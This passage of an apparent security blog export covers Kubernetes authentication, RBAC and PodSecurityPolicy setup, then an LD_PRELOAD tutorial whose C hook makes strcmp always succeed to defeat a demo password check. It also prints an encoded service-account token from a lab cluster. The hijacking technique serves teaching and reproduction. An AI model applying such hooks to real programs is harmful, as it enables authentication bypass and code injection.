ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqVmxZa3gyYVdSbmR6QlZibTQyVkhZelFtTlhhWGRqZGtsNGNHWnlXREZGZDNsMGFGQkpZM3B4TkVraWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbXBsYm10cGJuTXRkRzlyWlc0dFl6Sm1iR3dpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pYW1WdWEybHVjeUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJbVl6WVRZeE9HWmhMVEEzWWpVdE5ESmxaQzFoWmpKbExURTNaREV6TXpCa09HUmpaQ0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21wbGJtdHBibk1pZlEuS3BWMlJ6M0RoWmRpQjJaNk9aWVVwVG9xOFJJc3VQWjFGbkp5RGpqSmluTjNkbHZxdl8tWUpob05wZm9vNkszUnRYNWRYczFkRnplNjZmYlJxbUJibHBGRVh0bXBtazNOM1hYZEFsdlhPWUpYRjU0b3JJTmliTncxUEZDcUZGY0k3ZFFEVWNpQkp2ZjJXUkhFZkZIb3JnUHNlOGFnbEpMdlpzMzdWWW1IZFJKWWQwMThhZW1wajhqZE5WdTNsWXJSQWoyMTNlQk1yemhxdHRyd2RNeVZFejBoVklBdE9MUE5QZ3pwRXFVSUp0Qm5rclVOb1BRNGFXUVlSWDM1eEdLTENGQUJNY3RmdEhHTE0zQlozby1yamx5X2tsdC1jcUdPcXdZSG0zc2ZzOXpYOG85Mm9BRkdDME9xeUQ1T2xLNmNoajNTbjd6UXRZTGhXaXI4R1dfNWhn</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除该账号</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl delete serviceaccount jenkins</span></span><br><span class="line">serviceaccount <span class="string">&quot;jenkins&quot;</span> deleted</span><br></pre></td></tr></table></figure>



<h2 id="3-X-509客户端"><a href="#3-X-509客户端" class="headerlink" title="3. X.509客户端"></a>3. X.509客户端</h2><p>X.509客户端证书也可称为HTTPS证书认证，是基于CA根证书签名的双向数字证书认证方式，默认情况下Kubernetes开启此参数配置。</p>
<p>与X.509客户端证书相关的三个kube-apiserver启动参数：</p>
<p>1）client-ca-file: 指定CA根证书文件，内置CA公钥</p>
<p>2）tls-private-key-file：API Server私钥文件位置</p>
<p>3）tls-cert-file：API Server证书文件</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@master manifests]# cat <span class="regexp">/etc/</span>kubernetes<span class="regexp">/manifests/</span>kube-apiserver.yaml</span><br><span class="line">......</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - command:</span><br><span class="line">	........</span><br><span class="line">    - --client-ca-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>ca.crt</span><br><span class="line">    - --tls-cert-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>apiserver.crt</span><br><span class="line">    - --tls-<span class="keyword">private</span>-key-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>apiserver.key</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>

<p>集群内部都是通过HTTPS证书互相访问，如果是集群外未配置证书的主机访问集群就会提示未授权访问。</p>
<h2 id="4-OpenID-Connect（OIDC）令牌"><a href="#4-OpenID-Connect（OIDC）令牌" class="headerlink" title="4. OpenID Connect（OIDC）令牌"></a>4. OpenID Connect（OIDC）令牌</h2><p><a href="https://openid.net/connect/">OpenID Connect</a> 是一种 OAuth2 认证方式， 被某些 OAuth2 提供者支持，例如 Azure 活动目录、Salesforce 和 Google。 协议对 OAuth2 的主要扩充体现在有一个附加字段会和访问令牌一起返回， 这一字段称作 <a href="https://openid.net/specs/openid-connect-core-1_0.html#IDToken">ID Token（ID 令牌）</a>。 ID 令牌是一种由服务器签名的 JSON Web 令牌（JWT），其中包含一些可预知的字段， 例如用户的邮箱地址，</p>
<p>要识别用户，身份认证组件使用 OAuth2 <a href="https://openid.net/specs/openid-connect-core-1_0.html#TokenResponse">令牌响应</a> 中的 <code>id_token</code>（而非 <code>access_token</code>）作为持有者令牌。 </p>
<p><img src="../images/pic/k8s12.jpg"></p>
<h2 id="5-Webhook-令牌身份认证"><a href="#5-Webhook-令牌身份认证" class="headerlink" title="5. Webhook 令牌身份认证"></a>5. Webhook 令牌身份认证</h2><p>Webhook 身份认证是一种用来验证持有者令牌的回调机制。</p>
<ul>
<li><code>--authentication-token-webhook-config-file</code> 指向一个配置文件，其中描述 如何访问远程的 Webhook 服务。</li>
<li><code>--authentication-token-webhook-cache-ttl</code> 用来设定身份认证决定的缓存时间。 默认时长为 2 分钟。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kubernetes API 版本</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="comment"># API 对象类别</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="comment"># clusters 指代远程服务</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">name-of-remote-authn-service</span></span><br><span class="line">    <span class="attr">cluster:</span></span><br><span class="line">      <span class="attr">certificate-authority:</span> <span class="string">/path/to/ca.pem</span>         <span class="comment"># 用来验证远程服务的 CA</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">https://authn.example.com/authenticate</span> <span class="comment"># 要查询的远程服务 URL。必须使用 &#x27;https&#x27;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># users 指代 API 服务的 Webhook 配置</span></span><br><span class="line"><span class="attr">users:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">name-of-api-server</span></span><br><span class="line">    <span class="attr">user:</span></span><br><span class="line">      <span class="attr">client-certificate:</span> <span class="string">/path/to/cert.pem</span> <span class="comment"># Webhook 插件要使用的证书</span></span><br><span class="line">      <span class="attr">client-key:</span> <span class="string">/path/to/key.pem</span>          <span class="comment"># 与证书匹配的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kubeconfig 文件需要一个上下文（Context），此上下文用于本 API 服务器</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">webhook</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">name-of-remote-authn-service</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">name-of-api-sever</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">webhook</span></span><br></pre></td></tr></table></figure>





<h2 id="6-身份认证代理"><a href="#6-身份认证代理" class="headerlink" title="6. 身份认证代理"></a>6. 身份认证代理</h2><p>API 服务器可以配置成从请求的头部字段值（如 <code>X-Remote-User</code>）中辩识用户。 这一设计是用来与某身份认证代理一起使用 API 服务器，代理负责设置请求的头部字段值。</p>
<ul>
<li><code>--requestheader-username-headers</code> 必需字段，大小写不敏感。用来设置要获得用户身份所要检查的头部字段名称列表（有序）。第一个包含数值的字段会被用来提取用户名。</li>
<li><code>--requestheader-group-headers</code> 可选字段，在 Kubernetes 1.6 版本以后支持，大小写不敏感。 建议设置为 “X-Remote-Group”。用来指定一组头部字段名称列表，以供检查用户所属的组名称。 所找到的全部头部字段的取值都会被用作用户组名。</li>
<li><code>--requestheader-extra-headers-prefix</code> 可选字段，在 Kubernetes 1.6 版本以后支持，大小写不敏感。 建议设置为 “X-Remote-Extra-“。用来设置一个头部字段的前缀字符串，API 服务器会基于所给 前缀来查找与用户有关的一些额外信息。这些额外信息通常用于所配置的鉴权插件。 API 服务器会将与所给前缀匹配的头部字段过滤出来，去掉其前缀部分，将剩余部分 转换为小写字符串并在必要时执行<a href="https://tools.ietf.org/html/rfc3986#section-2.1">百分号解码</a> 后，构造新的附加信息字段键名。原来的头部字段值直接作为附加信息字段的值。</li>
</ul>
<h2 id="7-API-Server授权"><a href="#7-API-Server授权" class="headerlink" title="7. API Server授权"></a>7. API Server授权</h2><p>Kubernetes包含四类授权模式：</p>
<ul>
<li>节点(Node)授权</li>
<li>基于属性的访问控制（Attribute-Based Access Control, ABAC)</li>
<li> 基于角色的访问控制（Role-Based Access Control, RBAC）</li>
<li>基于钩子（Webhook）方式的授权</li>
</ul>
<p>目前使用RBAC机制较多。</p>
<p>RBAC策略包含以下核心概念。</p>
<p>1）Resource: 指Kubernetes中的资源，如Pod、Service等。</p>
<p>2）Role: 对Resource执行的操作，如对Pod执行create、update、delete等操作。</p>
<p>3）Entity: 代表一个应用程序，可以是一个用户、组或服务账户</p>
<p>4）Role Binding: 将Role绑定到Entity，表明在指定Resource上运行某Entity并执行一组操作。</p>
<p>就Role和Role Binding而言，Kubernetes定义了两种范围类型：</p>
<p>1）集群范围：Cluster Role和Cluster Role Binding</p>
<p>2）命名空间范围：Role和Role Binding</p>
<p><strong>常用的命令：</strong></p>
<ol>
<li><p>查看所有命名空间的Cluster Role:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl get clusterroles --all-namespaces</span></span><br><span class="line">NAME                                                                   CREATED AT</span><br><span class="line">admin                                                                  2021-12-27T06:26:04Z</span><br><span class="line">calico-kube-controllers                                                2021-12-27T06:30:23Z</span><br><span class="line">calico-node                                                            2021-12-27T06:30:24Z</span><br><span class="line">cluster-admin                                                          2021-12-27T06:26:04Z</span><br><span class="line">edit                                                                   2021-12-27T06:26:04Z</span><br><span class="line">kubeadm:get-nodes                                                      2021-12-27T06:26:11Z</span><br><span class="line">kubernetes-dashboard                                                   2022-01-04T04:32:05Z</span><br><span class="line">system:aggregate-to-admin                                              2021-12-27T06:26:04Z</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li>
<li><p>查看所有命名空间的Role：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl get roles --all-namespaces</span></span><br><span class="line">NAMESPACE              NAME                                             CREATED AT</span><br><span class="line">kube-public            kubeadm:bootstrap-signer-clusterinfo             2021-12-27T06:26:11Z</span><br><span class="line">kube-public            system:controller:bootstrap-signer               2021-12-27T06:26:04Z</span><br><span class="line">kube-system            extension-apiserver-authentication-reader        2021-12-27T06:26:04Z</span><br><span class="line">kube-system            kube-proxy                                       2021-12-27T06:26:12Z</span><br><span class="line">kube-system            kubeadm:kubelet-config-1.21                      2021-12-27T06:26:05Z</span><br><span class="line">kube-system            kubeadm:nodes-kubeadm-config                     2021-12-27T06:26:05Z</span><br><span class="line">kube-system            system::leader-locking-kube-controller-manager   2021-12-27T06:26:0</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
<li><p>查看预定义的Cluster Role对资源的访问权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl describe clusterrole view</span></span><br><span class="line">Name:         view</span><br><span class="line">Labels:       kubernetes.io/bootstrapping=rbac-defaults</span><br><span class="line">              rbac.authorization.k8s.io/aggregate-to-edit=<span class="literal">true</span></span><br><span class="line">Annotations:  rbac.authorization.kubernetes.io/autoupdate: <span class="literal">true</span></span><br><span class="line">PolicyRule:</span><br><span class="line">  Resources                                    Non-Resource URLs  Resource Names  Verbs</span><br><span class="line">  ---------                                    -----------------  --------------  -----</span><br><span class="line">  bindings                                     []                 []              [get list watch]</span><br><span class="line">  configmaps                                   []                 []              [get list watch]</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>案例：创建一个用例来处理特殊的资源</strong></p>
<p>1）为应用服务程序建立服务账户资源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl create namespace coolapp</span></span><br><span class="line">namespace/coolapp created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create serviceaccount myappid</span></span><br><span class="line">serviceaccount/myappid created</span><br></pre></td></tr></table></figure>

<p>2）创建role，该Role只能在coolapp命名空间中查看和列出Pod。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create role podview --verb=get --verb=list --resource=pods</span></span><br><span class="line">role.rbac.authorization.k8s.io/podview created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp describe role/podview</span></span><br><span class="line">Name:         podview</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">PolicyRule:</span><br><span class="line">  Resources  Non-Resource URLs  Resource Names  Verbs</span><br><span class="line">  ---------  -----------------  --------------  -----</span><br><span class="line">  pods       []                 []              [get list</span><br></pre></td></tr></table></figure>

<p>3）创建Role Binding，将Role “podview”绑定至名为myappid的应用程序中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create rolebinding mypodviewer --role=podview --serviceaccount=coolapp:myappid</span></span><br><span class="line">rolebinding.rbac.authorization.k8s.io/mypodviewer created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp describe rolebinding/mypodviewer</span></span><br><span class="line">Name:         mypodviewer</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Role:</span><br><span class="line">  Kind:  Role</span><br><span class="line">  Name:  podview</span><br><span class="line">Subjects:</span><br><span class="line">  Kind            Name     Namespace</span><br><span class="line">  ----            ----     ---------</span><br><span class="line">  ServiceAccount  myappid  coolapp</span><br></pre></td></tr></table></figure>

<p>通过以上部分完成了RBAC的创建，下面我们可以通过Kubectl验证myappid服务账户是否拥有对Pod资源的list权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp auth can-i --as=system:serviceaccount:coolapp:myappid list pods</span></span><br><span class="line">yes</span><br></pre></td></tr></table></figure>

<p>再验证myappid服务账户是否拥有对Service资源的list权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp auth can-i --as=system:serviceaccount:coolapp:myappid list services</span></span><br><span class="line">no</span><br></pre></td></tr></table></figure>



<h2 id="8-准入控制器"><a href="#8-准入控制器" class="headerlink" title="8. 准入控制器"></a>8. 准入控制器</h2><p>当用户请求通过了API Server认证和授权后，便进入了准入控制器环节，相比于前面的API Server 的认证与授权机制，准入控制器是更为细粒度的资源控制机制，其支持Kubernetes的许多高级功能，如Pod安全策略（Pod Security Policy）、安全上下文（Security Context）、服务账户（Service Account）等。</p>
<p>准入控制器主要分为两个阶段，第一个阶段运行变更准入控制器，第二个阶段运行验证准入控制器。变更准入控制器和验证准入控制器都是通过Webhook的方式进行实现</p>
<h3 id="8-1-Pod安全策略"><a href="#8-1-Pod安全策略" class="headerlink" title="8.1 Pod安全策略"></a>8.1 Pod安全策略</h3><p>Pod安全策略是集群级别的资源，主要在Pod的创建和更新阶段提供细粒度的权限控制，其在Kubernetes中被定义为一个准入控制器，集群管理员可通过kube-apiserver配置文件中指定”–enable-admission-plugins=NodeRestriction, PodSecurityPolicy”来完成启动。</p>
<p>Pod安全策略资源定义了一组Pod运行时必须遵守的条件及相关字段的默认值，只有Pod满足这些条件才会被Kubernetes接受。此外，Pod安全策略定义完成后，需要使用RBAC对其授权才能正常使用。</p>
<p><strong>案例演示：</strong></p>
<p>给api server添加psp权限</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>kubernetes<span class="regexp">/manifests/</span>kube-apiserver.yaml </span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s13.jpg"> </p>
<p>为运行此示例，配置一个名字空间和一个服务账号。我们将用这个服务账号来 模拟一个非管理员账号的用户。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">kubectl <span class="keyword">create</span> <span class="keyword">namespace</span> psp-example</span><br><span class="line">kubectl <span class="keyword">create</span> serviceaccount -n psp-example fake-<span class="keyword">user</span></span><br><span class="line">kubectl <span class="keyword">create</span> rolebinding -n psp-example fake-editor --clusterrole=edit --serviceaccount=psp-example:fake-<span class="keyword">user</span></span><br></pre></td></tr></table></figure>

<p>创建两个别名，以更清晰地展示我们所使用的用户账号，同时减少一些键盘输入：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> kubectl-admin=&#x27;kubectl -n psp-<span class="built_in">example</span>&#x27;</span><br><span class="line"><span class="built_in">alias</span> kubectl-user=&#x27;kubectl --as=<span class="built_in">system</span>:serviceaccount:psp-<span class="built_in">example</span>:fake-user -n psp-<span class="built_in">example</span>&#x27;</span><br></pre></td></tr></table></figure>

<p>example-psp.yaml:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">policy/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodSecurityPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">false</span>  <span class="comment"># Don&#x27;t allow privileged pods!</span></span><br><span class="line">  <span class="comment"># The rest fills in some required fields.</span></span><br><span class="line">  <span class="attr">seLinux:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">supplementalGroups:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">runAsUser:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">fsGroup:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用 kubectl 执行创建操作：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">kubectl-<span class="keyword">admin</span> <span class="keyword">create</span> -f example-psp.yaml</span><br></pre></td></tr></table></figure>

<p>现在，作为一个非特权用户，尝试创建一个简单的 Pod：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">kubectl-user</span> <span class="string">create</span> <span class="string">-f-</span> <span class="string">&lt;&lt;EOF</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pause</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pause</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">k8s.gcr.io/pause</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error </span>from server (Forbidden): error when creating &quot;STDIN&quot;: pods &quot;pause&quot; is forbidden: PodSecurityPolicy: unable to admit pod: []</span><br></pre></td></tr></table></figure>

<p> 尽管 PodSecurityPolicy 被创建，Pod 的服务账号或者 <code>fake-user</code> 用户都没有使用该策略的权限。</p>
<h2 id="9-参考"><a href="#9-参考" class="headerlink" title="9. 参考"></a>9. 参考</h2><p><a href="https://kubernetes.io/">https://kubernetes.io/</a></p>
<p>《云原生攻防实践与体系构建》</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s基本概念</title>
    <url>/Kubernetes%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<blockquote>
<p>天下皆知美之为美，斯恶已；皆知善之为善，斯不善已。</p>
</blockquote>
<p>掌握k8s基本概念</p>
<span id="more"></span>

<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>我们都经常使用docker，docker是对容器的封装。它极大的简化了系统的的构建和维护。使得 <code>Docker</code> 技术比虚拟机技术更为轻便、快捷。从而让容器技术应用越来越广泛。</p>
<p>当容器变多了的时候，我们需要同一管理容器的平台，Kubernetes应运而生，Kubernetes是使用最为广泛的容器编排平台。</p>
<h2 id="2-k8s架构"><a href="#2-k8s架构" class="headerlink" title="2. k8s架构"></a>2. k8s架构</h2><p><img src="../images/pic/k8s1.png"></p>
<p><strong>Node：</strong></p>
<p>我们可以把每个宿主机看成一个节点，每个节点又数个pod构成，pod由有一个或多个容器构成。</p>
<p><strong>Master节点：</strong></p>
<p>master节点是负责管理其他节点的主节点</p>
<p><strong>pod:</strong></p>
<p>一个pod相当于运行的一个应用或者服务</p>
<p><strong>API Server:</strong></p>
<p>通过API Server接口可以对集群进行管理</p>
<p><strong>kubelet:</strong></p>
<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
<p><strong>etcd：</strong></p>
<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
<h2 id="3-k8s设计理念"><a href="#3-k8s设计理念" class="headerlink" title="3. k8s设计理念"></a>3. k8s设计理念</h2><p>k8s集群都是通过API的方式进行通讯，这也是分布式系统的设计理念。API都是遵循Restful API接口规范。</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>LD_PRELOAD学习</title>
    <url>/LD-PRELOAD%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>身是菩提树，心如明镜台。时时勤拂拭，勿使惹尘埃。</p>
<p>菩提本无树，明镜亦非台。本来无一物，何处惹尘埃。</p>
</blockquote>
<p>参考Mockingjay师傅的<a href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">文章</a>进行复现。</p>
<span id="more"></span>

<p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。</p>
<h2 id="1-链接"><a href="#1-链接" class="headerlink" title="1. 链接"></a>1. 链接</h2><p>程序的链接主要有以下三种：</p>
<ul>
<li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li>
<li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</li>
<li>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接</li>
</ul>
<p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致一些非预期的执行结果或者绕过某些安全设置。</p>
<h2 id="2-LD-PRELOAD"><a href="#2-LD-PRELOAD" class="headerlink" title="2. LD_PRELOAD"></a>2. LD_PRELOAD</h2><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<h2 id="3-LD-PRELOAD-Hook"><a href="#3-LD-PRELOAD-Hook" class="headerlink" title="3. LD_PRELOAD Hook"></a>3. LD_PRELOAD Hook</h2><p>由于 LD_PRELOAD 可以指定在程序运行前优先加载的动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过指定 LD_PRELOAD 让程序优先加载的这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体的操作步骤如下：</p>
<ol>
<li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li>
<li>将包含替换函数的源码编译为动态链接库。</li>
<li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库即可。</li>
<li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li>
</ol>
<p>下面我们通过一个简单的实例进行演示：</p>
<p>passcheck.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;given-password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;32mPassword Correct!\n\033[m&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;31mPassword Wrong!\n\033[m&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写如上程序，如过密码等于passwd就打印Password Correct。如果密码错误就打印Password Wrong。</p>
<p>编译上述程序</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc passcheck.<span class="keyword">c</span> -o passcheck</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># gcc passcheck.c -o passcheck</span></span><br><span class="line">[root@vuln /tmp]<span class="comment"># ./passcheck password</span></span><br><span class="line">Password Correct!</span><br><span class="line">[root@vuln /tmp]<span class="comment"># ./passcheck a</span></span><br><span class="line">Password Wrong!</span><br><span class="line">[root@vuln /tmp]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>现在定义一个strcmp函数编译成.so文件，用LD_PRELOAD加载来劫持原有的strcmp函数</p>
<ul>
<li>hook_strcmp.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strcmp.c -o hook_strcmp.so</span><br></pre></td></tr></table></figure>

<p>加载执行有三种方式：</p>
<ol>
<li><p>一次加载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD=<span class="variable">$PWD</span><span class="regexp">/hook_strcmp.so ./</span>passcheck password</span><br></pre></td></tr></table></figure></li>
<li><p>当前终端有效</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strcmp.so</span><br></pre></td></tr></table></figure></li>
